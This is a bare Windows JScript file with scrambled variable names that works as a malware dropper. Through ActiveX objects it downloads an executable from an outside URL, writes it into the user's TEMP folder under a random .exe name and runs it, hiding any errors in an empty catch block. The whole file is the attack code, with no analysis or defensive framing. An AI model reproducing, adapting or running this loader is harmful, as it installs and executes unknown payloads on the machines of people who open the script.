const VOTkxF = ActiveXObject;
const vhYpG = new VOTkxF('WScript.Shell');
const bKmwUXzzg = vhYpG.ExpandEnvironmentStrings('%TEMP%') + '/NSXgoiRAq.exe';
const unGwGWcC = new VOTkxF('MSXML2.XMLHTTP');

unGwGWcC['onreadystatechange'] = function () {
        const EpUPmURAD = new VOTkxF('ADODB.Stream');

        EpUPmURAD.open();
        EpUPmURAD['type'] = 1;
        EpUPmURAD.write(unGwGWcC.ResponseBody);
        EpUPmURAD['position'] = 0;
        EpUPmURAD.saveToFile(bKmwUXzzg, 2);
        EpUPmURAD.close();
};
try {
    const tzyhXVuc = 'Run';

    unGwGWcC.open('GET', 'http://example.com/system/logs/87h754', false);
    unGwGWcC.send();
    vhYpG.Run(bKmwUXzzg, 1, false);
} catch (ajg9ggxFs) {};
